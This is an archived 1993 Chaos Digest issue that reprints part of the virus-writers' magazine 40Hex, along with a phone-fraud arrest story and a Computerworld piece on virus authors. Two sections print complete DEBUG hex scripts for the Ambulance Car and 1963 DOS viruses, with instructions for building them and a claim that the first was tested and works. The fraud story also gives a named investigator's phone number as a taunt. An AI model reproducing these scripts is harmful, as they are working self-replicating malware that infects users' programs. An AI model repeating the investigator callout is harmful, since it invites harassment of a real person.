------------------------------

Date: 03 Jun 93 23:59:59 GMT
From: jbcondat@attmail.com (Jean-Bernard Condat )
Subject: File 4--L'annuaire electronique [11] en langues etrangeres (acces)
Repost from: telecom3.373.2@eecs.nwu.edu


Since the beginning of February, the French "Annuaire Electronique" is
available in Italian language. You can access it, from France, by
dialing 3614 code RAE, and from other countries, by MinitelNet or by a
telephone line: +33 36 43 14 14 code RAE (Ricerca Annuario
Elettronico).

             +----------------------------------------+
             |      *R*icerca                         |
             |      *A*nnuario                        |
             |      *E*lettronico                     |
             |                                        |
             |   1    Ricerca di un abbonato          |
             |                                        |
             |   2    LA POSTA : codice di            |
             |        avviamento postale              |
             |                                        |
             |   3    Sapere tutto sull'elenco        |
             |        elettronico                     |
             |                                        |
             |   4    Sapere tutto sul minitel        |
             |                                        |
             |   5    L'elenco elettronico            |
             |        e teletel dall'estero           |
             |                                        |
             |----------------------------------------|
             |          N! scelto: ...    poi  Invio  |
             | (C) France Telecom 1992                |
             +----------------------------------------+

For all versions, all diagnostics, instructions and list of
professionnals are translate into the appropriate language.  Five
different options are available: "Search for a subscriber", "The Post
Office: Postal Code", "All you need to know about the Electronic
Directory", "All you need to know about the Minitel", "Electronic
Directory and Teletel from abroad".

Called the "11" in France, this service is already available in:

   * English: 3614 code ED  [Electronic Directory];
   * Spanish: 3614 code GTE [Guidia Telefonica Electronia];
   * German : 3614 code ETB [Elektronisches Telefonbuch].

------------------------------

End of Chaos Digest #1.45
***********************************

Chaos Digest                Lundi 7 Juin 1993        Volume 1 : Numero 46
                             ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.46 (7 Juin 1993)
File 1--File 1--40H VMag Number 5 Volume 2 Issue 1 #000-004 (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Number 5 Volume 2 Issue 1 #000-004 (reprint)


40Hex Number 5 Volume 2 Issue 1                                     File 000

        Welcome to Issue 5 of 40Hex, the monthy semi-annual magazine
published for all those interested in learning more about computer viruses.

        Lots of new news:

1) Well, Hellraiser has lost computer and housing temporarily, so DecimatoR
   had taken over the magazine.  There has been so much new stuff, a lot got
   changed since the time I received this issue.  Special BIG ASS greets to
   him for all of his work on this issue.
2) Digital Warfare is down, as Instigator got busted for phreaking.  We will
   let you know more when we know more.  Before its demise, its virus
   collection had grown incredibly, thus stocking 40Hex for life.
3) LandFill BBS went back up. I am back in the scene again.  Give it a ring.
4) As of the release of this file, I have heard of more busts, specifically,
   Gengis Kahn and Rain Man.... could be rumor.

   BTW, for those of you who have the "Anti-FiRe" virus, SCAN 86 catches
   it as "Infinity"... probably due to the text it contains.  Course, it was
   distributed on a VGA loader for the InFiniTy boards... heh heh heh...

                                              DecimatoR

                                              -)GHeap


                             40 Hex Mag Issue 5

        File 000..............................You Are Here
        File 001..............................BUSTED! Instigator's Story
        File 002..............................Virus Spotlight: Ambulance Car
        File 003..............................The 1963 Virus
        File 004..............................Alliance w/McAfee and Dvorak
        File 005..............................Virus Author's Constitution
        File 006..............................The SKISM Vengeance Virus Hex
        File 007..............................Finding Scan Strings II


Greets go out to: Hellraiser, Dark Angel, Demogorgon, Piff', Paragon Dude
                  Instigator, Night Crawler, Crow Meister, Lazarus Long,
                  Time Lord, Axiom Codex, and the rest of the Alliance crew.

+++++

40Hex Number 5 Volume 2 Issue 1                                      File 001


                         Instigator --- Busted!

At 2:40 pm EST, Jan 20, '92 a local cop pulled Instigator (me) out of my very
entertaining Social Studies class and informed me he, 1 other local cop and
2 MCI phone fraud investigators were gonna serve a warrant on my house and
confiscate my computer shit.  So the cop takes me to my house and they start
disassembling all of my computer stuff, and take all of my notes and shit.
They filmed all this.  They informed me I would be charged with theft of
services, credit card fraud and a bunch of other shit, like 3 felonys and
5 misdimeanors till they were done.  Anyways its about a week and a half
after the incident now and they only formally charged me with theft of
services.  So the worst that is gonna happen is I will get 1 year of
probation.  The best thing is they are thinking of only giving me a citation
or totally dropping the charges.  I am suppose to get my system back after
the DA comes to my house so I can show him how I did it.  As for Digital
Warfare I wanna give to someone to set up.  Anyway I made it to the front
page of 3 local newspapers so here is one of the articles:

-----------------------------------------------------------------------------

               (Shit inside the ***( )*** are my comments)

                       From the front page of the
                         Intelligencer Journal

               2 "Hackers" caught stealing phone service

  Using sophisticated computers and telephones, two Lancaster County
computer hackers touched MCI, a Washington-based telephone communications
network, for approximately $4,700 last year. ***( Sophisticated phones? )***

  Their activities represent "only the tip of the iceberg" of
telecommunications fraud, which carries an annual $1 billion to $1.5 billion
price tag, according to John Houser, a MCI spokesman. ***( Dick )***

  The two are accused of accessing MCI's computer and obtaining "25 card
numbers, thet we know about," Houser said.  "We know they made calls all over
the United Sates, to Canada, Great Britain, and West Germany"

  "None of the card numbers have been issued to Lancaster subscribers,"
Houser said.

  Columbia police are charging an 18 year old borough resident with credit
card fraud, unlawful use of a computer, theft of services, and criminal
conspiracy according to Sgt. C. Joseph Smith. Police are withholding his
identity until he is formally charged, Smith said.

  West Donegal Township chief Charles R. Bronte said a fifteen year old
suspect ***( that's me! )*** living in his jurisdiction was being refered to
juvenile authorities by the department investigator, Cpl. Kenton Whitebread.

  Officers with both departments said this was an entirely new kind of
criminal case for them.

  "I'm still going over our suspectes statement," said Smith, "and even when
I'm done, I don't think I'm going to understand (all the technical jargon).
We're getting a lot of help from MCI."

  "If our juvenile hadn't cooperated, it's possible we'd still be looking at
his equipment", Bronte said.  "He went into the computer, using his access
codes," ***( He means I logged on my board )*** " to retrieve the information
necessary to continue the investigation".

  Police confiscated computer telephone equipment, whose value is estimated
***( Estimated - Gimme a break!)***  in the thousands of dollars, when they
executed search warrants at the residences of both suspects, Jan. 20.

  "It was a real United Nations collection," said Bronte, "There were a
number of different manufacturers" of the equipment taken in West Donegal.
***( United Nations collection? )***

  Most of the equipment taken in Columbia was made by Tandy, Smith said.

  Both posessed programs and equipment which allowed their computers to
generate thousands of random numbers.

  Houser said that once an individual had knowledge of MCI's calling card
format "they could access our computer switching equipment, and begin
generating random numbers. ***( they make it sound so technical )*** They
could allow their equipment to run 24 hours a day."

  Houser declined discussing the company security, but acknowledged "We
became aware of an unusual number of calls coming into our computer line. We
eventually were able to trace those calls back to the originating telephone
equipment." ***( ANI )***

   Bronte said MCI investigators arrived at his department early Monday
afternoon.  The warrant was executed at 2 pm, Bronte said.  "We took
investigators to the suspects home, while Cpl. Whitebread picked up the
boy at his school.

     Smith said the Columbia warrant was served at 5:18pm on Monday.
The suspect and another individual were working on his computer at the time.
"They weren't doing anything illegal," he said.

     Smith said MCI first became aware of the two local hackers "about
Dec. 14".  They were monitoring them since."

     The officers said they did not believe either of the two profited
from their activities. ***( Free Phone calls! )***

     "I think it was just a case of him getting involved in someting that
was entirely over his head, Bronte said.  ***( Yeah, right )***

     Houser said MCI's investigation was continuing.

     "We have reason to believe they shared some of their information with
others," he said. "At this time I can tell you we have no other suspects in
Pennsylvania, but that could change tomorrow."

     He said investigators were unsure at present if any of the computer
data had been transmitted to other hackers. ***( They said one paragraph up
that they thought we shared some of the information.. Duh )***

-----------------------------------------------------------------------------
    Update --
    ++++++

  Here is the current casualties on the 476-9696 system, which is owned by
  TeleConnect, a subsidiary of MCI.

Instigator    -----  $1970.70  -----  Theft of Services(1 Count)
Asphi         -----  $2700.00  -----  Unlawful Use of Computer
                                      Credit Card Fraud
                                      Theft Of Services
                                      Criminal Conspiracy
Dekion        -----   UNKNOWN  -----  UNKNOWN
Count Zero    -----  $83.63    -----  No Charges Just Billed (*)
VenoM         -----  $75.00    -----  No Charges Just Billed (*)

   Apparently the head of the operations is Terry Oakes.  He is the phone
   Fraud investigator in charge of the TeleConnect Investigations.  Give him
   a ring at 800-476-1234 Ext. 3045.  Thank you.

(*) In both cases parents were notified.
                                                -)GHeap

+++++

40Hex Number 5 Volume 2 Issue 1                                      File 002

                           Virus Spotlight:
                       The Ambulance Car Virus

Here's a debug script of the Ambulance Car virus.  I've tested the virus
created from this, and it works.  Ambulance Car is a parasitic, non-resident
.COM infector.  It spreads rapidly, and has one of the neatest graphic
displays that I've seen yet in a virus.  When it activates, a little ambulance
drives across the bottom of the screen, from left to right, and a siren is
heard over the PC speaker.  Other than that, all this thing does is replicate.

To create the virus from the debug script, cut between the dotted lines and
type:

  DEBUG < REDX.TXT > NUL

-----------------------------------------------------------------------------

n redx.com
e 0100  EB 37 90 48 65 6C 6C 6F 20 2D 20 43 6F 70 79 72
e 0110  69 67 68 74 20 53 20 26 20 53 20 45 6E 74 65 72
e 0120  70 72 69 73 65 73 2C 20 31 39 38 38 0A 0D 24 1A
e 0130  B4 09 BA 03 01 CD 21 CD 20 E8 01 00 01 5E 81 EE
e 0140  03 01 E8 1A 00 E8 17 00 E8 D2 01 8D 9C 19 04 BF
e 0150  00 01 8A 07 88 05 8B 47 01 89 45 01 FF E7 C3 E8
e 0160  DE 00 8A 84 28 04 0A C0 74 F4 8D 9C 0F 04 FF 07
e 0170  8D 94 28 04 B8 02 3D CD 21 89 84 17 04 8B 9C 17
e 0180  04 B9 03 00 8D 94 14 04 B4 3F CD 21 8A 84 14 04
e 0190  3C E9 75 3F 8B 94 15 04 8B 9C 17 04 83 C2 03 33
e 01A0  C9 B8 00 42 CD 21 8B 9C 17 04 B9 06 00 8D 94 1C
e 01B0  04 B4 3F CD 21 8B 84 1C 04 8B 9C 1E 04 8B 8C 20
e 01C0  04 3B 84 00 01 75 0C 3B 9C 02 01 75 06 3B 8C 04
e 01D0  01 74 64 8B 9C 17 04 33 C9 33 D2 B8 02 42 CD 21
e 01E0  2D 03 00 89 84 12 04 8B 9C 17 04 B8 00 57 CD 21
e 01F0  51 52 8B 9C 17 04 B9 19 03 8D 94 00 01 B4 40 CD
e 0200  21 8B 9C 17 04 B9 03 00 8D 94 14 04 B4 40 CD 21
e 0210  8B 9C 17 04 33 C9 33 D2 B8 00 42 CD 21 8B 9C 17
e 0220  04 B9 03 00 8D 94 11 04 B4 40 CD 21 5A 59 8B 9C
e 0230  17 04 B8 01 57 CD 21 8B 9C 17 04 B4 3E CD 21 C3
e 0240  A1 2C 00 8E C0 1E B8 40 00 8E D8 8B 2E 6C 00 1F
e 0250  F7 C5 03 00 74 17 33 DB 26 8B 07 3D 50 41 75 08
e 0260  26 81 7F 02 54 48 74 0B 43 0B C0 75 EB 8D BC 28
e 0270  04 EB 32 83 C3 05 8D BC 28 04 26 8A 07 43 0A C0
e 0280  74 19 3C 3B 74 05 88 05 47 EB EF 26 80 3F 00 74
e 0290  0A D1 ED D1 ED F7 C5 03 00 75 DB 80 7D FF 5C 74
e 02A0  04 C6 05 5C 47 1E 07 89 BC 22 04 B8 2A 2E AB B8
e 02B0  43 4F AB B8 4D 00 AB 06 B4 2F CD 21 8C C0 89 84
e 02C0  24 04 89 9C 26 04 07 8D 94 78 04 B4 1A CD 21 8D
e 02D0  94 28 04 33 C9 B4 4E CD 21 73 08 33 C0 89 84 28
e 02E0  04 EB 29 1E B8 40 00 8E D8 D1 CD 33 2E 6C 00 1F
e 02F0  F7 C5 07 00 74 06 B4 4F CD 21 73 E7 8B BC 22 04
e 0300  8D 9C 96 04 8A 07 43 AA 0A C0 75 F8 8B 9C 26 04
e 0310  8B 84 24 04 1E 8E D8 B4 1A CD 21 1F C3 06 8B 84
e 0320  0F 04 25 07 00 3D 06 00 75 15 B8 40 00 8E C0 26
e 0330  A1 0C 00 0B C0 75 08 26 FF 06 0C 00 E8 02 00 07
e 0340  C3 1E BF 00 B8 B8 40 00 8E D8 A0 49 00 3C 07 75
e 0350  03 BF 00 B0 8E C7 1F BD F0 FF BA 00 00 B9 10 00
e 0360  E8 3F 00 42 E2 FA E8 16 00 E8 7B 00 45 83 FD 50
e 0370  75 E8 E8 03 00 1E 07 C3 E4 61 24 FC E6 61 C3 BA
e 0380  D0 07 F7 C5 04 00 74 03 BA B8 0B E4 61 A8 03 75
e 0390  08 0C 03 E6 61 B0 B6 E6 43 8B C2 E6 42 8A C4 E6
e 03A0  42 C3 51 52 8D 9C BF 03 03 DA 03 D5 0B D2 78 34
e 03B0  83 FA 50 73 2F BF 80 0C 03 FA 03 FA 2B D5 B9 05
e 03C0  00 B4 07 8A 07 2C 07 02 C1 2A C2 83 F9 05 75 0A
e 03D0  B4 0F F7 C5 03 00 74 02 B0 20 AB 83 C3 10 81 C7
e 03E0  9E 00 E2 DD 5A 59 C3 1E B8 40 00 8E D8 A1 6C 00
e 03F0  3B 06 6C 00 74 FA 1F C3 22 23 24 25 26 27 28 29
e 0400  66 87 3B 2D 2E 2F 30 31 23 E0 E1 E2 E3 E4 E5 E6
e 0410  E7 E7 E9 EA EB 30 31 32 24 E0 E1 E2 E3 E8 2A EA
e 0420  E7 E8 E9 2F 30 6D 32 33 25 E1 E2 E3 E4 E5 E7 E7
e 0430  E8 E9 EA EB EC ED EE EF 26 E6 E7 29 59 5A 2C EC
e 0440  ED EE EF F0 32 62 34 F4 09 00 E9 36 00 EB 2E 90
e 0450  05 00 EB 2E 90

rcx
0355
w
q

----------------------------------------------------------------------------
                                                                          DA

+++++

40Hex Number 5 Volume 2 Issue 1                                     File 003

                               The 1963 Virus

        Here's a debug script of 1963.  It's classified as an overwriting
virus, but it attaches the code it overwrites onto the end of the file it
infects...  so it overwrites, but it doesn't.  Sort of.

----------------------------------------------------------------------------

n 1963.com
e 0100  B4 30 CD 21 3C 03 72 07 B8 00 12 CD 2F 3C FF B8
e 0110  0B 00 72 71 B4 4A BB 40 01 CD 21 72 68 FA 0E 17
e 0120  BC FE 13 E8 C5 00 FB A1 2C 00 0B C0 74 61 E8 BB
e 0130  06 8E C0 33 FF 33 C0 AF 75 FD AF 8B D7 06 1F B4
e 0140  48 BB FF FF CD 21 B4 48 CD 21 8E C0 B4 49 CD 21
e 0150  33 C0 8B CB 8C C3 51 B9 08 00 33 FF F3 AB 43 8E
e 0160  C3 59 E2 F2 0E 07 BB 04 09 8B FB AB B0 80 AB 8C
e 0170  C8 AB B8 5C 00 AB 8C C8 AB B8 6C 00 AB 8C C8 AB
e 0180  B8 00 4B CD 21 0E 1F E8 62 06 2E FF 2E 0A 00 B8
e 0190  20 12 BB 05 00 CD 2F 53 4B 4B 26 88 1D B8 16 12
e 01A0  CD 2F 4B 4B 26 89 1D B4 48 BB FF FF CD 21 B4 48
e 01B0  CD 21 8E D8 5B B8 00 42 33 C9 33 D2 CD 21 B4 3F
e 01C0  BA 00 01 26 8B 4D 11 CD 21 72 BA B4 3E CD 21 B4
e 01D0  26 8C DA CD 21 4A 8E C2 26 8C 1E 01 00 42 8E C2
e 01E0  8E D2 BC FE FF 1E B8 00 01 50 CB 1E B8 03 12 CD
e 01F0  2F 2E 8C 1E 04 09 33 F6 8E DE BF 88 02 8C CE 87
e 0200  3E 04 00 87 36 06 00 9C 9C 9C 8B EC 80 4E 01 01
e 0210  9D 9C 9C 2E C7 06 06 09 AF 08 B4 01 FF 1E 4C 00
e 0220  9D 2E C7 06 06 09 AB 08 B4 0B FF 1E 84 00 9D 89
e 0230  3E 04 00 89 36 06 00 1F 1E 06 8C CB BD AE 02 A1
e 0240  AB 08 8B 16 AD 08 33 F6 8E DE 3B 06 84 00 75 10
e 0250  3B 16 86 00 75 0A 89 2E 84 00 89 1E 86 00 EB 25
e 0260  B8 AB 08 8E C3 B9 10 00 FC 8B F8 8E DA A7 75 0B
e 0270  A7 75 06 89 6C FC 89 5C FE 4E 4E 4E E2 EB 87 F1
e 0280  42 3B D3 75 E4 07 1F C3 55 8B EC 50 8B 46 04 2E
e 0290  3B 06 04 09 77 15 53 2E 8B 1E 06 09 2E 89 47 02
e 02A0  8B 46 02 2E 89 07 80 66 07 FE 5B 58 5D CF 55 8B
e 02B0  EC 80 FC 48 74 0A 80 FC 4A 74 05 3D 03 4B 75 0C
e 02C0  E8 89 05 E8 AF 05 9C E8 87 05 EB 55 80 FC 31 74
e 02D0  05 80 FC 4C 75 0D 53 BB 13 00 E8 55 02 4B 79 FA
e 02E0  5B EB 5F 80 FC 0F 74 0F 80 FC 10 74 0A 80 FC 17
e 02F0  74 05 80 FC 23 75 05 E8 25 05 EB 46 80 FC 3F 75
e 0300  25 E8 2E 02 73 06 B8 05 00 E9 F7 00 75 34 E8 64
e 0310  05 72 F6 9C E8 6D 05 1E 07 8B FA E8 67 04 E8 75
e 0320  05 9D 5D CA 02 00 80 FC 3D 74 0A 80 FC 43 74 05
e 0330  80 FC 56 75 05 E8 E1 01 EB 08 80 FC 3E 75 0E E8
e 0340  F0 01 FF 76 06 9D 5D FA 2E FF 2E AB 08 80 FC 14
e 0350  74 0D 80 FC 21 74 08 80 FC 27 74 03 E9 7F 00 E8
e 0360  BD 04 73 04 5D B0 01 CF 75 D8 E8 17 05 E8 A4 04
e 0370  80 FC 14 75 14 8B 44 0C BA 80 00 F7 E2 33 DB 02
e 0380  44 20 12 E3 13 DA 93 EB 06 8B 44 23 8B 5C 21 8B
e 0390  4C 0E F7 E1 73 05 E8 FD 04 EB C9 93 F7 E1 03 D3
e 03A0  72 F4 2E A3 D0 08 2E 89 16 D2 08 2E 89 0E D4 08
e 03B0  E8 E3 04 E8 BF 04 0A C0 74 04 3C 03 75 1E E8 C3
e 03C0  04 80 FC 27 2E A1 D4 08 75 04 F7 E1 72 C8 50 B4
e 03D0  2F CD 21 8B FB 58 E8 AC 03 E8 BA 04 5D CF 3D 00
e 03E0  4B 74 2A 3D 01 4B 74 03 E9 57 FF E8 41 00 72 13
e 03F0  56 57 1E 0E 1F BE E2 08 8D 7F 0E FC A5 A5 A5 A5
e 0400  1F 5F 5E 9C D0 6E 06 9D D0 56 06 5D CF E8 1F 00
e 0410  72 F1 50 B4 51 CD 21 8E DB 8E C3 58 FA 2E 8B 26
e 0420  E2 08 2E 8E 16 E4 08 44 44 FB 2E FF 2E E6 08 E8
e 0430  52 04 F9 E8 E4 00 B8 0B 00 72 32 FC 9C 1E B8 22
e 0440  35 CD 21 2E 89 1E B7 08 2E 8C 06 B9 08 C5 76 0A
e 0450  0E 07 BF D4 08 8B DF B9 07 00 F3 A5 1F E8 EC 03
e 0460  52 B8 01 4B E8 12 04 5A E8 E6 03 73 07 89 46 08
e 0470  E8 23 04 C3 89 46 08 B4 51 CD 21 8E C3 8B 76 00
e 0480  36 C5 54 02 26 89 16 0A 00 26 8C 1E 0C 00 B8 22
e 0490  25 CD 21 9D 75 DA 0E 1F BE 04 09 BF 00 01 B9 AB
e 04A0  07 F3 A4 E8 B2 02 74 03 F8 EB C5 8B FB 83 C7 10
e 04B0  A1 B1 10 A3 E6 08 A1 B3 10 03 C7 A3 E8 08 8B 0E
e 04C0  AF 10 0B C9 74 E2 C5 56 0E E8 96 03 72 35 8B D8
e 04D0  51 0E 1F 33 C9 8B 16 02 09 E8 8F 03 BA 04 09 59
e 04E0  51 B9 04 00 E8 7D 02 59 72 16 8B F2 1E 8B 44 02
e 04F0  8B 34 03 C7 8E D8 01 3C 1F E2 E5 E8 69 03 EB A8
e 0500  E8 64 03 06 1F 2E C4 1E B7 08 89 1E 0A 00 8C 06
e 0510  0E 00 E8 D7 02 F9 E9 1D FF F8 50 53 9C E8 42 03
e 0520  72 0C 8B D8 9D 9C E8 0A 00 9C E8 3A 03 9D 5B 5B
e 0530  58 C3 F8 FC E8 4D 03 9C 53 B8 20 12 CD 2F 72 0C
e 0540  32 FF 26 8A 1D B8 16 12 CD 2F 73 04 E8 47 03 C3
e 0550  06 0E 1F B8 23 35 CD 21 89 1E BB 08 8C 06 BD 08
e 0560  40 CD 21 89 1E BF 08 8C 06 C1 08 B4 25 BA 81 08
e 0570  CD 21 48 42 42 CD 21 07 5B B0 02 26 86 45 02 A2
e 0580  C9 08 26 8B 45 05 A3 CA 08 26 8B 45 15 A3 D0 08
e 0590  26 8B 45 17 A3 D2 08 26 8B 45 11 26 8B 55 13 A3
e 05A0  CC 08 89 16 CE 08 3D 1A 00 83 DA 00 72 55 9D 72
e 05B0  16 26 8B 45 28 3D 45 58 74 07 3D 43 4F 75 44 B0
e 05C0  4D 26 3A 45 2A 75 3C 33 C9 33 D2 E8 9D 02 BA EA
e 05D0  08 B1 1A E8 8E 01 72 3D 33 C9 33 D2 E8 79 01 75
e 05E0  0B A1 F2 08 B2 10 F7 E2 8B CA 8B D0 51 52 81 C2
e 05F0  AB 07 83 D1 00 3B 0E CE 08 75 04 3B 16 CC 08 5A
e 0600  59 76 02 EB 58 51 52 E8 61 02 BA 04 09 B9 AB 07
e 0610  E8 51 01 73 02 EB 3F 06 57 0E 07 BE EF 09 BF EB
e 0620  01 B9 C3 00 F3 A6 5F 07 75 5F 8B D1 E8 41 02 B9
e 0630  AD 07 BA 04 09 E8 20 01 75 03 83 C1 06 26 01 4D
e 0640  11 26 83 55 13 00 E8 1B 01 72 0B 8B F2 49 49 E8
e 0650  26 01 3B 14 74 03 F9 EB 08 3A C0 EB 04 B0 01 3C
e 0660  00 9C BE C9 08 FC 47 47 A4 47 47 A5 83 C7 0A A5
e 0670  A5 A5 A5 B8 24 25 C5 16 BF 08 CD 21 48 2E C5 16
e 0680  BB 08 CD 21 9D E8 0E 02 C3 26 F6 45 04 04 75 CD
e 0690  B4 0D CD 21 53 1E 06 B8 40 35 CD 21 89 1E C3 08
e 06A0  8C 06 C5 08 B0 13 CD 21 89 1E B3 08 8C 06 B5 08
e 06B0  B4 25 C5 16 AF 08 CD 21 B0 40 BA 59 EC BB 00 F0
e 06C0  8E DB CD 21 07 1F 5B 33 C9 33 D2 E8 A2 01 B9 AB
e 06D0  07 BE 04 09 E8 81 00 75 15 83 C1 06 A1 F0 08 A3
e 06E0  AF 10 A1 FE 08 A3 B1 10 A1 00 09 A3 B3 10 56 E8
e 06F0  86 00 89 14 5A 41 41 E8 74 00 72 39 5A 59 E8 6A
e 0700  01 BA 00 01 B9 AB 07 E8 64 00 72 2F E8 49 00 75
e 0710  20 33 C9 89 0E F0 08 89 16 FE 08 C7 06 00 09 F0
e 0720  FF 33 D2 E8 45 01 BA EA 08 B9 1A 00 E8 3F 00 72
e 0730  0A 3A C0 EB 07 B0 01 3C 00 EB 01 F9 9C B4 0D CD
e 0740  21 1E B8 13 25 C5 16 B3 08 CD 21 B0 40 2E C5 16
e 0750  C3 08 CD 21 1F E9 0A FF A1 EA 08 3D 4D 5A 74 03
e 0760  3D 5A 4D C3 B4 3F E8 10 01 72 02 3B C1 C3 B4 40
e 0770  E8 06 01 72 02 3B C1 C3 51 33 D2 AC 02 D0 80 D6
e 0780  00 E2 F8 59 C3 0E 1F BE 04 09 8B D8 B9 AB 07 E8
e 0790  C6 FF 75 27 A1 F2 08 BA 10 00 F7 E2 53 57 E8 1E
e 07A0  00 5F 5B BE EA 08 B9 1A 00 A1 AF 10 A3 F0 08 A1
e 07B0  B1 10 A3 FE 08 A1 B3 10 A3 00 09 33 C0 33 D2 2B
e 07C0  06 D0 08 1B 16 D2 08 72 0A 75 20 2B D8 76 1C 03
e 07D0  F8 EB 0F F7 D8 83 D2 00 F7 DA 75 0F 2B C8 76 0B
e 07E0  03 F0 3B CB 76 02 8B CB FC F3 A4 C3 9C E8 94 00
e 07F0  B4 49 1E 07 CD 21 B4 49 8E 06 2C 00 CD 21 B4 50
e 0800  8B 1E 16 00 CD 21 B8 22 25 C5 16 0A 00 CD 21 E8
e 0810  84 00 9D C3 8B F2 80 3C FF 75 03 83 C6 07 C3 E8
e 0820  62 00 E8 EF FF 0E 07 BA 04 09 8B FA FC AC 0A C0
e 0830  74 05 04 40 B4 3A AB A5 A5 A5 A5 B0 2E AA A5 A4
e 0840  32 C0 AA 06 1F E8 D1 FC E8 4B 00 C3 50 8C C8 EB
e 0850  03 50 33 C0 53 1E 8C CB 4B 8E DB A3 01 00 1F 5B
e 0860  58 C3 B8 00 3D EB 12 B4 3E EB 0E B8 00 42 EB 09
e 0870  B8 02 42 EB 04 FF 76 06 9D 9C FA 2E FF 1E AB 08
e 0880  C3 B0 03 CF 2E 8F 06 C7 08 1E 52 06 53 50 51 56
e 0890  57 55 8B EC EB 10 2E 8F 06 C7 08 8B E5 5D 5F 5E
e 08A0  59 58 5B 07 5A 1F 2E FF 26 C7 08 00 00 00 00 00
e 08B0  00 00 00 00 00 44 83 00 00 44 83 00 00 44 83 00
e 08C0  00 44 83 00 00 44 83 00 00 00 00 00 00 00 00 00
e 08D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 08E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 08F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

rcx
0800
w
q

+++++

40Hex Number 5 Volume 2 Issue 1                                    File 004

                           Forty Hex 5
                            Presents

                    An Alliance Interview with
                     John McAfee + Jon Dvorak
                               and
                 Hellraiser, Garbageheap, DecimatoR,
                  Count Zero, CRoW MeiSTeR, Instigator,
                   Demogorgon, Dark Angel, Night Crawler,
                    VenoM, Time Lord, Darkman.

On Feb. 2nd of 1992, an alliance was run with members of PHALCON/SKISM,
NuKE, and Ex-RABiD.  We started the conference by trying to call Patti
Hoffman, who had a shit fit, and denied being the author of VSUM.  Nice
of her to insult our intelligence.  But anyways, we then called McAfee,
who was surprisingly a nice guy.  He was interested in what we had to say.
Some of the topics covered were which viruses we had written, what types
of viri they were(i.e. MemRes, Stealth...).  Another important topic
covered the Bob Ross Virus which an associate of McAfee had misnamed the
Beta Virus(it was first spread on a false version of BNU(1.90Beta)).

On the following day, we started a second alliance, this time involving
Count Zero, CRoW MeiSTeR, Dark Angel, Demogorgon, Garbageheap(moi!),
Hellraiser, Instigator, Night Crawler and Time Lord.  Also in the
conference were John Markoff(New York Times), Michael Alexander(Computer
World), and John McAfee.  A variety of topics were covered, I won't go into
specifics here, because in a future issue we will have a full transcript,
and in this issue we will have the article from the Feb. 10,1992 Vol.XXVI
No. 6 issue of COMPUTERWORLD.

---------------------------------------------------------------------------
CHALLENGE, NOTORIETY CITED AS IMPETUS FOR VIRUS DEVELOPERS(*Catchy title*)
                    By: Michael Alexander/CW STAFF

     What motivates a programmer to write a virus?  The thrill, declared
Hell Raiser,(* that is supposed to be Hellraiser *) a self-styled virus
author and a member of Phalcon/Skism, a group of about a dozen computer
hackers scattered across North America.

     In an unusual telephone conference call to COMPUTERWORLD last week, 10
callers who said they were members of Phalcon/Skism claimed to be
responsible for writing several of the viruses now on the
loose.(* CLAIMED?!?!?!!  Well, I suppose that he couldnt know if we were the
real McCoy *)

     To protect their identities, the callers used such handles as Garbage
Heap(* Grabbin' top billin'! *), Nightcrawler, Demogorgon, Dark Angel, and
Time Lord.  They said their ages range from 15 to 23 years old, although
COMPUTERWORLD could not independantly verify their identities.

GETTING ATTENTION
+++++++++++++++++

     The virus authors, as they called themselves, said they arranged the
teleconference to air their side of the story, and to talk about their
unorthadox and contradictory brand of computer ethics. (* Well... close,
we were real bored... of course, who wants to talk to bored virus
authors... *)  "For the most part, virus authors are seen as a lot more
malicious than we actually are," Garbage Heap said.

     His compatriots said they write viruses mainly for the thrill but
also for the challenge and the status it brings within the computer
underground.  The group said it is not interested in doing harm, and
seldom creates viruses that are deliberately designed to cause damage.
"It's sort of like graffiti  -  getting our name across  -  and damage
happens in the process," he claimed.(* Hellraiser *)

     As an example of the type of virus they write, the group took credit
for writing the Bob Ross Virus, named after the painter of the same name on
who hosts a show on Public Broadcasting Service.

     "What it does is infect files and randomly displays 'Bobisms,' which
are messages Bob Ross would say," Hell Raiser said.  "It doesn't format
the hard drive or do any damage."

     However, other alleged members of Phalcon/Skism later admitted to
writing viruses that are clearly intended to damage or destroy programs
and data.(* Hellraiser again... *)

     The callers contended that they are virus "authors," not virus
"spreaders," and that they are not responsible for the problems their
creations cause.

     "The main difference is that an author may write a virus and may even
upload that virus to a virus board, a [bulletin Board system] oriented to
virus programmers and spreaders," one virus author explained.

